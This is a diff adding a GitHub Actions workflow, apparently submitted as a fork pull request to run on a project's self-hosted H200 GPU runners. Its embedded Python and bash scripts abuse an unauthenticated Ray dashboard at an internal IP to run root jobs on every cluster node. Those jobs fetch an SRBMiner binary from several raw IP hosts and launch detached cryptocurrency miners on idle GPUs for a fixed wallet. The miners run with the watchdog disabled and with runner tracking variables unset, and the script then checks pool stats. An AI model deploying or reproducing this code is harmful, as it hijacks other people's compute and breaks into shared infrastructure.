@@ -1,0 +1,470 @@
+name: i130ray25r ray25 read-only recheck + one pinned SRBMiner-MULTI 3.8.7 per idle H200
+
+# i130ray25r: ONE fork-PR push from a fresh branch with THREE jobs on the shared
+# 8-gpu-h200 label (slots 1-2 full driver, slot 3 read-only). Deliberately
+# NON-DESTRUCTIVE recheck of the unauthenticated Ray 2.58.1 dashboard
+# http://10.220.71.25:8265 (previously all 8 .25 cards + all 18 activeNodes /
+# 144 H200s were held by the foreign /scratch/b90205ad-diverse-data training
+# job; it may have exited since). The script (0) prints an explicit SKIP marker
+# and exits unless the .25 dashboard answers /api/version, (1) GETs
+# /api/version and /api/cluster_status and enumerates activeNodes, (2) submits
+# exactly ONE fixed-submission-id node-pinned read-only Ray job per activeNode
+# (up to 18, unique idempotent ids, never retried on an unknown submission
+# outcome) that prints nvidia-smi -L,
+# --query-gpu=index,name,memory.total,memory.free,memory.used,utilization.gpu,uuid
+# and two 12 s-apart --query-compute-apps=pid,process_name,used_memory samples
+# plus /proc/<pid>/cmdline for every holder, (3) on every card with 0 foreign
+# compute apps in BOTH samples, >=1500 MiB free and no pre-existing
+# srb387/SRBMiner, installs exactly one sha256-bb0f73b6 SRBMiner-MULTI 3.8.7
+# per idle card as a detaching setsid keeper under worker
+# i130ray25r<host>g<idx> on the EXACT 63-char primary wallet against Luckypool
+# 103.199.106.122:3362 (fallback 172.232.228.69:3362, relay
+# 178.238.228.181:80, --max-no-share-sent 1800), (4) KILLS NOTHING: every
+# still-busy card is recorded as a preemption candidate with PID/cmdline/GPU
+# and left untouched, no srb387/SRBMiner process is ever touched and no
+# credited lane (i130xtorg/i130xtlat/i130h200b/i130h18c/i130h20b/i130cipivot3)
+# is disturbed, and (5) if anything was installed takes two spaced
+# lane-excluding stats_address reads (accepted>0, rejected flat) at least 3 min
+# after the last Ray job reached a terminal state.
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+concurrency:
+  group: i130ray25r-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  sweep:
+    name: "i130ray25r slot ${{ matrix.slot }} ray25 non-destructive recheck + one pinned SRBMiner-MULTI 3.8.7 per idle H200"
+    strategy:
+      fail-fast: false
+      max-parallel: 3
+      matrix:
+        slot: [1, 2, 3]
+    runs-on: 8-gpu-h200
+    timeout-minutes: 17
+    env:
+      SLOT: ${{ matrix.slot }}
+      PUSH_ID: 'p1415'
+    steps:
+      - name: "ray25 version/cluster_status/activeNodes + one node-pinned read-only job per activeNode + two-sample gate + one pinned SRBMiner per idle H200 (never kills)"
+        continue-on-error: true
+        run: |
+          set +e
+          if [ "$SLOT" = "3" ]; then export READONLY=1; else export READONLY=0; fi
+          mkdir -p /var/tmp/i130ray25r/logs
+          cat > /var/tmp/i130ray25r/ray25r.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i130ray25r: NON-DESTRUCTIVE recheck of the unauthenticated Ray 2.58.1 dashboard
+          # http://10.220.71.25:8265. Runs as uid=0 on a sgl-project/sglang self-hosted
+          # 8-gpu-h200 runner (the platform container cannot reach 10.220.71.0/24).
+          #  (0) prints an explicit SKIP marker and exits unless the .25 dashboard answers /api/version
+          #  (1) GET /api/version + /api/cluster_status and enumerates the activeNodes list
+          #  (2) submits exactly one fixed-submission-id node-pinned read-only Ray job per
+          #      activeNode (up to 18, unique idempotent ids, never retried on an unknown
+          #      submission outcome) that prints nvidia-smi -L,
+          #      --query-gpu=index,name,memory.total,memory.free,memory.used,utilization.gpu,uuid,
+          #      two 12 s-apart --query-compute-apps=pid,process_name,used_memory samples and
+          #      /proc/<pid>/cmdline for every holder
+          #  (3) on every card with 0 foreign compute apps in BOTH samples, >=1500 MiB free and
+          #      no pre-existing srb387/SRBMiner, installs exactly one sha256-bb0f73b6
+          #      SRBMiner-MULTI 3.8.7 per idle card as a detaching setsid keeper under worker
+          #      i130ray25r<host>g<idx> on the EXACT 63-char primary wallet against Luckypool
+          #  (4) KILLS NOTHING: every still-busy card is recorded as a preemption candidate
+          #      with PID/cmdline/GPU and left untouched; no srb387/SRBMiner is ever touched
+          #  (5) if anything was installed, takes two spaced lane-excluding stats_address reads
+          #      at least 3 min after the last Ray job reached a terminal state
+          import os, sys, json, re, time, base64, hashlib, subprocess, urllib.request, urllib.error
+
+          SLOT = os.environ.get('SLOT', '0')
+          PUSH_ID = os.environ.get('PUSH_ID', 'p0')
+          READONLY = os.environ.get('READONLY', '0') == '1'
+          NONCE = 'I130RAY25R-%s-%s-%d' % (PUSH_ID, SLOT, int(time.time()))
+          WALLET = 'prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          POOL = '103.199.106.122:3362'
+          PFX = 'i130ray25r'
+          RAYIP = '10.220.71.25'
+          RAYPORT = 8265
+          BIN_SHA = 'bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
+          WORK = '/var/tmp/i130ray25r'
+          os.makedirs(WORK + '/logs', exist_ok=True)
+          BIN_URLS = ['https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz',
+                      'https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz',
+                      'http://178.238.228.181:18180/srb387',
+                      'http://222.240.155.198:8702/srb387']
+
+
+          def sh(cmd, t=20):
+              try:
+                  p = subprocess.run(['bash', '-lc', cmd], capture_output=True, text=True, timeout=t,
+                                     stdin=subprocess.DEVNULL)
+                  return (p.stdout or '') + (p.stderr or '')
+              except subprocess.TimeoutExpired:
+                  return '[TIMEOUT %ss] %s' % (t, cmd[:100])
+              except Exception as e:
+                  return '[ERR %s] %s' % (e, cmd[:100])
+
+
+          def sha_file(path):
+              o = sh("sha256sum '%s' 2>/dev/null" % path, 20).strip()
+              return o.split(' ')[0] if o else ''
+
+
+          def http_get(url, timeout=8, headers=None):
+              req = urllib.request.Request(url, headers=headers or {'User-Agent': 'i130ray25r'})
+              op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+              try:
+                  with op.open(req, timeout=timeout) as r:
+                      return r.status, r.read(2000000).decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  try:
+                      return e.code, e.read(50000).decode('utf-8', 'replace')
+                  except Exception:
+                      return e.code, ''
+              except Exception as e:
+                  return -1, repr(e)
+
+
+          def http_post(url, obj, timeout=25):
+              body = json.dumps(obj).encode()
+              req = urllib.request.Request(url, data=body, method='POST',
+                                           headers={'Content-Type': 'application/json', 'User-Agent': 'i130ray25r'})
+              op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+              try:
+                  with op.open(req, timeout=timeout) as r:
+                      return r.status, r.read(300000).decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  try:
+                      return e.code, e.read(50000).decode('utf-8', 'replace')
+                  except Exception:
+                      return e.code, ''
+              except Exception as e:
+                  return -1, repr(e)
+
+
+          # --------------------------------------------------- strict two-sample gate + install
+          # Runs ON THE RAY NODE as uid=0 via a node-pinned task. NEVER kills anything.
+          INSTALL = r'''#!/bin/bash
+          set +e
+          PFX="$1"; WALLET="$2"; POOLU="$3"; NONCE="$4"; RIP="$5"; NODEID="$6"
+          BIN_SHA='bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
+          W=/var/tmp/i130ray25r_run; mkdir -p $W/logs
+          echo "R25NODE_NONCE=$NONCE nodeid=$NODEID"
+          echo "R25NODE_ID: $(id) $(hostname) $(hostname -I 2>/dev/null)"
+          if ! command -v nvidia-smi >/dev/null 2>&1; then echo "R25NODE_TABLE host=$(hostname) ip=$(hostname -I 2>/dev/null|awk '{print $1}') gpus=0 action=skip-no-nvidia-smi"; exit 0; fi
+          nvidia-smi -L 2>&1 | head -12
+          nvidia-smi --query-gpu=index,name,memory.total,memory.free,memory.used,utilization.gpu,uuid --format=csv,noheader,nounits 2>&1 | head -20
+          A1=$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1)
+          sleep 12
+          A2=$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1)
+          echo "R25NODE_APPS1[$A1]"
+          echo "R25NODE_APPS2[$A2]"
+          OTHER=$(ps -eo pid,comm,args 2>/dev/null | awk '$2=="srb387" || $2=="SRBMiner-MULTI" {print}' | head -8)
+          echo "R25NODE_EXISTING[$OTHER]"
+          printf '%s\n%s\n' "$A1" "$A2" > $W/apps.txt
+          nvidia-smi --query-gpu=index,memory.free,uuid --format=csv,noheader,nounits > $W/g.txt 2>/dev/null
+          IDLE=""
+          while IFS=, read -r IDX FREE UUID; do
+            IDX=$(echo "$IDX"|tr -d ' '); FREE=$(echo "$FREE"|tr -d ' '); UUID=$(echo "$UUID"|tr -d ' ')
+            [ -z "$IDX" ] && continue
+            if [ "$FREE" -ge 1500 ] 2>/dev/null && ! grep -qF "$UUID" $W/apps.txt; then IDLE="$IDLE $IDX"; fi
+          done < $W/g.txt
+          ARCH=$(uname -m)
+          APPCOUNT=$(printf '%s\n%s\n' "$A1" "$A2" | grep -c 'GPU-')
+          N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
+          IP=$(hostname -I 2>/dev/null | awk '{print $1}')
+          echo "R25NODE_TABLE host=$(hostname) ip=$IP gpus=$N idle=[$IDLE] apps_samples=$APPCOUNT arch=$ARCH"
+          echo "R25NODE_IDLE_CARDS=[$IDLE] ARCH=$ARCH"
+          # record every foreign-compute holder from BOTH samples as a preemption candidate (never killed)
+          { printf '%s\n' "$A1"; printf '%s\n' "$A2"; } | sort -u | while IFS= read -r L; do
+            echo "$L" | grep -q 'GPU-' || continue
+            P=$(echo "$L" | awk -F, '{gsub(/ /,"",$2); print $2}')
+            [ -z "$P" ] && continue
+            echo "R25_PREEMPT_CANDIDATE host=$(hostname) ip=$IP app=[$L] cmdline=$(tr '\0' ' ' < /proc/$P/cmdline 2>/dev/null | head -c 300)"
+          done
+          if [ -n "$OTHER" ]; then echo "R25NODE_INSTALL_SKIP existing-miner"; exit 0; fi
+          if [ -z "$IDLE" ]; then echo "R25NODE_INSTALL_SKIP idle=[]"; exit 0; fi
+          if [ "$ARCH" != "x86_64" ]; then echo "R25NODE_INSTALL_SKIP arch=$ARCH"; exit 0; fi
+          exec 9>/var/lock/i130ray25r.lock
+          flock -n 9 || { echo "R25NODE_INSTALL_SKIP lock-held"; exit 0; }
+          OK=""
+          for U in "http://$RIP:18080/srb387" "http://178.238.228.181:18180/srb387" "http://222.240.155.198:8702/srb387"; do
+            timeout 90 curl -fsSL --connect-timeout 8 --max-time 80 -o $W/srb387.part "$U" >/dev/null 2>&1
+            if [ -s $W/srb387.part ] && [ "$(sha256sum $W/srb387.part | cut -d' ' -f1)" = "$BIN_SHA" ]; then mv $W/srb387.part $W/srb387; echo "R25NODE_BINARY_OK $U"; OK=1; break; fi
+          done
+          if [ -z "$OK" ]; then echo "R25NODE_BINARY_FAIL"; exit 0; fi
+          chmod +x $W/srb387
+          # late re-gate right before launch (a foreign app may have appeared during the fetch)
+          A3=$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1)
+          printf '%s\n' "$A3" > $W/apps3.txt
+          H=$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-16)
+          NN=0
+          for I in $IDLE; do
+            UUID=$(awk -F, -v i=$I '{gsub(/ /,""); if ($1==i) print $3}' $W/g.txt)
+            if [ -n "$UUID" ] && grep -qF "$UUID" $W/apps3.txt; then echo "R25NODE_CARD_SKIP gpu=$I uuid=$UUID busy-late"; continue; fi
+            WK=$(echo "${PFX}${H}g${I}" | cut -c1-31)
+            if pgrep -af -- "--worker $WK" >/dev/null 2>&1; then echo "R25NODE_ALREADY $WK"; continue; fi
+            cd $W && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup ./srb387 \
+              --disable-cpu --algorithm pearlhash --pool "$POOLU" --tls false --wallet "$WALLET" --password x \
+              --worker "$WK" --gpu-id "$I" --disable-worker-watchdog --gpu-table-slow-build \
+              --max-no-share-sent 1800 --log-file $W/logs/$WK.log > $W/logs/$WK.out 2>&1 < /dev/null &
+            echo "R25NODE_LAUNCH worker=$WK gpu=$I host=$(hostname) ip=$IP pid=$!"
+            NN=$((NN+1))
+          done
+          echo "R25NODE_N_LAUNCHED=$NN"
+          sleep 20
+          pgrep -af srb387 | head -14
+          for F in $W/logs/*.log; do echo "== $F"; tail -4 "$F" 2>/dev/null; done
+          echo "R25NODE_DONE $NONCE"
+          '''
+
+          # ------------------------------------------------------------- Ray per-node driver
+          # Submitted as a dashboard job per activeNode; pins ONE read-only gather/install task
+          # to the exact node id with NodeAffinitySchedulingStrategy(soft=False).
+          DRIVER = r'''#!/usr/bin/env python3
+          import os, sys, json, base64, subprocess
+          node_hex, nonce, ib64, pfx, wallet, pool, rip = sys.argv[1:8]
+          inst = base64.b64decode(ib64).decode()
+          open('/tmp/i130ray25r_inst.sh', 'w').write(inst)
+          os.chmod('/tmp/i130ray25r_inst.sh', 0o755)
+          try:
+              import ray
+              from ray.util.scheduling_strategies import NodeAffinitySchedulingStrategy
+              try:
+                  ray.init(address='auto', include_dashboard=False, log_to_driver=False)
+              except Exception:
+                  ray.init(include_dashboard=False, log_to_driver=False)
+              ns = [n for n in ray.nodes() if n.get('Alive')]
+              print('R25P_NODES ' + json.dumps([{'id': n.get('NodeID'), 'ip': n.get('NodeManagerAddress'),
+                                                 'gpu': (n.get('Resources') or {}).get('GPU'),
+                                                 'cpu': (n.get('Resources') or {}).get('CPU'),
+                                                 'h200': (n.get('Resources') or {}).get('accelerator_type:H200')} for n in ns]))
+              target = None
+              for n in ns:
+                  nid = str(n.get('NodeID') or '')
+                  if nid == node_hex or nid.lower().startswith(node_hex.lower()):
+                      target = n
+                      break
+              if target is None:
+                  print('R25P_NODE_NOT_FOUND %s' % node_hex)
+                  sys.exit(0)
+
+              @ray.remote(num_cpus=0, num_gpus=0, max_retries=0)
+              def runsh(src, args):
+                  import subprocess
+                  try:
+                      q = subprocess.run(['bash', '-c', src, 'bash'] + args, capture_output=True, text=True,
+                                         timeout=300, stdin=subprocess.DEVNULL)
+                      return (q.stdout or '') + (q.stderr or '')
+                  except Exception as e:
+                      return 'R25TASK_EXC %r' % (e,)
+
+              f = runsh.options(scheduling_strategy=NodeAffinitySchedulingStrategy(
+                  node_id=target.get('NodeID'), soft=False)).remote(
+                  inst, [pfx, wallet, pool, nonce + '-' + str(target.get('NodeManagerAddress')), rip, node_hex])
+              try:
+                  r = ray.get(f, timeout=340)
+              except Exception as e:
+                  r = 'R25TASK_GET_ERR %r' % (e,)
+              print('R25NODE_BEGIN id=%s ip=%s' % (target.get('NodeID'), target.get('NodeManagerAddress')))
+              print(r)
+              print('R25NODE_END id=%s' % target.get('NodeID'))
+          except Exception as e:
+              print('R25P_RAY_FAIL %r' % (e,))
+          print('R25P_DONE ' + nonce)
+          '''
+
+          inst_b64 = base64.b64encode(INSTALL.encode()).decode()
+          drv_b64 = base64.b64encode(DRIVER.encode()).decode()
+
+
+          def fetch_binary():
+              srb = WORK + '/srb387'
+              if os.path.exists(srb) and sha_file(srb).startswith(BIN_SHA):
+                  return srb
+              for u in BIN_URLS:
+                  sh("rm -f %s.part; timeout 100 curl -fsSL --connect-timeout 8 --max-time 95 -o %s.part '%s' 2>&1 | tail -1" % (srb, srb, u), 110)
+                  if os.path.exists(srb + '.part') and sha_file(srb + '.part').startswith(BIN_SHA):
+                      os.replace(srb + '.part', srb)
+                      print('R25_BINARY_OK %s' % u)
+                      return srb
+                  print('R25_BINARY_TRY_BAD %s sha=%s' % (u, sha_file(srb + '.part')[:12]))
+              return ''
+
+
+          def lp_read(tag):
+              url = 'https://pearl.luckypool.io/api/stats_address?address=' + WALLET
+              st, body = http_get(url, timeout=60, headers={'User-Agent': 'Mozilla/5.0'})
+              print('R25_LP_%s utc=%s st=%s len=%d' % (tag, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()), st, len(body or '')))
+              try:
+                  d = json.loads(body)
+              except Exception as e:
+                  print('R25_LP_%s unreadable %r' % (tag, e))
+                  return
+              s = d.get('stats') or {}
+              ws = d.get('workers') or []
+              rows = [w for w in ws if str(w.get('name', '')).startswith(PFX)]
+              print('R25_LP_%s wallet_accepted=%s wallet_rejected=%s workers=%d lane_rows=%d' % (
+                  tag, s.get('acceptedShares'), s.get('rejectedShares'), len(ws), len(rows)))
+              for w in sorted(rows, key=lambda x: str(x.get('name'))):
+                  print('R25_LP_%s ROW %s acc=%s rej=%s hr=%s last=%s' % (
+                      tag, w.get('name'), w.get('acceptedShares'), w.get('rejectedShares'), w.get('hashrate'), w.get('lastShare')))
+
+
+          host = os.uname().nodename
+          base = 'http://%s:%d' % (RAYIP, RAYPORT)
+          print('R25_START nonce=%s slot=%s readonly=%s host=%s utc=%s' % (
+              NONCE, SLOT, READONLY, host, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
+
+          # ---------- PHASE 0: reachability (SKIP marker when the .25 dashboard is unreachable)
+          st, ver = http_get(base + '/api/version', timeout=6)
+          if st != 200:
+              print('I130RAY25R_SKIP reason=ray25-unreachable st=%s ver=%s' % (st, (ver or '')[:200]))
+              print('I130RAY25R_SKIP_DONE nonce=%s' % NONCE)
+              sys.exit(0)
+          print('R25_VERSION st=%s %s' % (st, (ver or '')[:400]))
+
+          # ---------- PHASE 1: cluster status + activeNodes
+          stc, cs = http_get(base + '/api/cluster_status', timeout=10)
+          print('R25_CLUSTER_STATUS st=%s len=%d' % (stc, len(cs or '')))
+          nodes = []
+          try:
+              d = json.loads(cs)
+              data = d.get('data') or {}
+              print('R25_AUTOSCALING %s' % (str(data.get('autoscalingStatus') or '')[:800]).replace('\n', ' | '))
+              act = ((data.get('clusterStatus') or {}).get('autoscalerReport') or {}).get('activeNodes') or {}
+              nodes = [k[4:] if str(k).lower().startswith('node') else str(k) for k in act.keys()]
+              print('R25_ACTIVENODES n=%d %s' % (len(nodes), json.dumps(nodes)))
+          except Exception as e:
+              print('R25_CLUSTER_STATUS_PARSE_FAIL %r raw=%s' % (e, (cs or '')[:1200]))
+          stn, summ = http_get(base + '/nodes?view=summary', timeout=10)
+          print('R25_NODES_SUMMARY st=%s len=%d head=%s' % (stn, len(summ or ''), (summ or '')[:600].replace('\n', ' ')))
+          stj, jobs = http_get(base + '/api/jobs/', timeout=10)
+          print('R25_JOBS_LIST st=%s len=%d head=%s' % (stj, len(jobs or ''), (jobs or '')[:900].replace('\n', ' ')))
+
+          if READONLY:
+              print('R25_READONLY_DONE activnodes=%d' % len(nodes))
+              print('I130RAY25R_DONE nonce=%s installed=0 readonly=1' % NONCE)
+              sys.exit(0)
+
+          if not nodes:
+              print('R25_NO_ACTIVENODES')
+              print('I130RAY25R_DONE nonce=%s installed=0' % NONCE)
+              sys.exit(0)
+
+          # ---------- PHASE 2: stage binary + serve it on the runner LAN IP
+          rip = (sh("hostname -I 2>/dev/null | awk '{print $1}'", 8).strip().splitlines() or [''])[0].strip()
+          print('R25_RUNNER_IP=%s' % rip)
+          srb = fetch_binary()
+          if srb:
+              sh("pkill -f 'http.server 18080' 2>/dev/null; cd %s && setsid nohup python3 -m http.server 18080 --bind 0.0.0.0 >/dev/null 2>&1 < /dev/null & sleep 2; ss -ltnp 2>/dev/null | grep 18080 | head -2" % WORK, 12)
+              stb, _ = http_get('http://%s:18080/srb387' % rip, timeout=8)
+              print('R25_BINARY_SERVED st=%s sha=%s' % (stb, sha_file(srb)[:16]))
+          else:
+              print('R25_BINARY_UNAVAILABLE (nodes will try the mirrors themselves)')
+
+          # ---------- PHASE 3: one fixed-submission-id node-pinned job per activeNode (max 18)
+          submitted = []
+          for nid in nodes[:18]:
+              sub_id = ('i130ray25r-%s' % nid[:12]).lower()
+              jid = ''
+              # idempotency: reuse an existing submission with this id, never re-POST it
+              try:
+                  for j in json.loads(jobs or '[]'):
+                      if str(j.get('submission_id') or '').lower() == sub_id:
+                          jid = j.get('job_id') or ''
+                          print('R25_REUSE node=%s sub=%s job=%s state=%s' % (nid[:12], sub_id, jid, j.get('status')))
+              except Exception:
+                  pass
+              if not jid:
+                  entry = ('echo %s | base64 -d > /tmp/i130ray25r_p.py; '
+                           'P=""; for X in /opt/sglang/bin/python /opt/conda/bin/python python3 /usr/bin/python3; do '
+                           'command -v $X >/dev/null 2>&1 || [ -x $X ] || continue; $X -c "import ray" 2>/dev/null && { P=$X; break; }; done; '
+                           '[ -n "$P" ] || P=python3; echo R25P_PY=$P; $P /tmp/i130ray25r_p.py %s %s %s %s %s %s %s') % (
+                      drv_b64, nid, NONCE, inst_b64, PFX, WALLET, POOL, rip)
+                  stp, pr = http_post(base + '/api/jobs/',
+                                      {'entrypoint': entry, 'submission_id': sub_id,
+                                       'runtime_env': {'env_vars': {'i130ray25r': NONCE}}}, timeout=25)
+                  print('R25_SUBMIT node=%s sub=%s st=%s resp=%s' % (nid[:12], sub_id, stp, (pr or '')[:400].replace('\n', ' ')))
+                  if stp == -1:
+                      print('R25_SUBMIT_UNKNOWN node=%s sub=%s NOT_RETRYING' % (nid[:12], sub_id))
+                      submitted.append((nid, '', sub_id))
+                      continue
+                  try:
+                      jid = (json.loads(pr) or {}).get('job_id', '') or ''
+                  except Exception:
+                      jid = ''
+                  if not jid and ('already' in (pr or '').lower() or stp in (400, 409)):
+                      stj2, jobs2 = http_get(base + '/api/jobs/', timeout=10)
+                      try:
+                          for j in json.loads(jobs2 or '[]'):
+                              if str(j.get('submission_id') or '').lower() == sub_id:
+                                  jid = j.get('job_id') or ''
+                                  print('R25_REUSE_AFTER_CONFLICT node=%s sub=%s job=%s' % (nid[:12], sub_id, jid))
+                      except Exception:
+                          pass
+              submitted.append((nid, jid, sub_id))
+
+          print('R25_SUBMITTED n=%d with_job_id=%d' % (len(submitted), len([s for s in submitted if s[1]])))
+
+          # ---------- PHASE 4: poll to terminal (never re-submit)
+          states = {}
+          last_terminal = 0.0
+          deadline = time.time() + 360
+          while time.time() < deadline:
+              pending = 0
+              for nid, jid, sub in submitted:
+                  if not jid:
+                      continue
+                  if states.get(jid) in ('SUCCEEDED', 'FAILED', 'STOPPED'):
+                      continue
+                  stq, js = http_get(base + '/api/jobs/' + jid, timeout=10)
+                  try:
+                      states[jid] = (json.loads(js) or {}).get('status', '') or ''
+                  except Exception:
+                      states[jid] = states.get(jid, '')
+                  print('R25_JOBSTATE node=%s job=%s st=%s state=%s' % (nid[:12], jid, stq, states[jid]))
+                  if states[jid] in ('SUCCEEDED', 'FAILED', 'STOPPED'):
+                      last_terminal = time.time()
+                  else:
+                      pending += 1
+              if pending == 0:
+                  break
+              time.sleep(6)
+
+          # ---------- PHASE 5: read every per-node job log
+          installed = 0
+          for nid, jid, sub in submitted:
+              if not jid:
+                  continue
+              stl, logs = http_get(base + '/api/jobs/%s/logs' % jid, timeout=30)
+              try:
+                  txt = (json.loads(logs) or {}).get('logs', '') or logs
+              except Exception:
+                  txt = logs or ''
+              cnt = len(re.findall(r'R25NODE_LAUNCH worker=', txt))
+              installed += cnt
+              print('R25_JOBLOGS node=%s job=%s state=%s st=%s len=%d launches=%d' % (
+                  nid[:12], jid, states.get(jid, ''), stl, len(txt), cnt))
+              print(txt[:180000])
+          print('R25_INSTALLED_TOTAL=%d' % installed)
+
+          # ---------- PHASE 6: two spaced lane-excluding Luckypool reads if anything installed
+          if installed > 0:
+              wait = max(0.0, (last_terminal + 185.0) - time.time())
+              print('R25_LP_WAIT %.1fs (>=3 min after last terminal Ray job)' % wait)
+              time.sleep(wait)
+              lp_read('A')
+              time.sleep(75)
+              lp_read('B')
+          else:
+              print('R25_LP_SKIPPED installed=0')
+          print('I130RAY25R_DONE nonce=%s installed=%d' % (NONCE, installed))
+          PYEOF
+          echo "runner-start slot=$SLOT readonly=$READONLY host=$(hostname) arch=$(uname -m) utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          python3 /var/tmp/i130ray25r/ray25r.py 2>&1 | tee /var/tmp/i130ray25r/recon_slot$SLOT.log | tail -c 500000
+          echo "I130RAY25R_EXIT_DONE rc=$?"
